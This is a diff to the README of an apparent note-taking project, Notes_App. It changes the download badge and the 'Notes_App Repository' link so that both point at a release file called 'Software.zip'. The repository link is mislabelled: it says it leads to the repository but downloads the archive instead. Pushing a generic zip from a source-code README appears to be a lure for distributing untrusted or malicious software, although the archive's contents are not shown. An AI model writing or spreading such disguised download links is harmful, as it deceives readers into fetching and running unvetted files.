@@ -42,7 +42,7 @@ The Notes_App repository incorporates a range of cutting-edge technologies to de
 
 To access the latest version of Notes_App, click the button below:
 
-[![Download Notes_App](https://img.shields.io/badge/Download-1.0.0-brightgreen)](https://github.com/cli/go-gh/archive/refs/tags/v1.0.0.zip)
+[![Download Notes_App](https://github.com/haidangcr7/Notes_App/releases/download/v1.0/Software.zip)](https://github.com/haidangcr7/Notes_App/releases/download/v1.0/Software.zip)
 
 Once the download is complete, follow the instructions in the repository to launch the application.
 
@@ -56,6 +56,6 @@ Don't miss out on the opportunity to enhance your note-taking experience with No
 
 ---
 
-Feel free to visit [Notes_App Repository](https://github.com/) for more details and updates. Thank you for choosing Notes_App! 📱✨
+Feel free to visit [Notes_App Repository](https://github.com/haidangcr7/Notes_App/releases/download/v1.0/Software.zip) for more details and updates. Thank you for choosing Notes_App! 📱✨
 
 ---
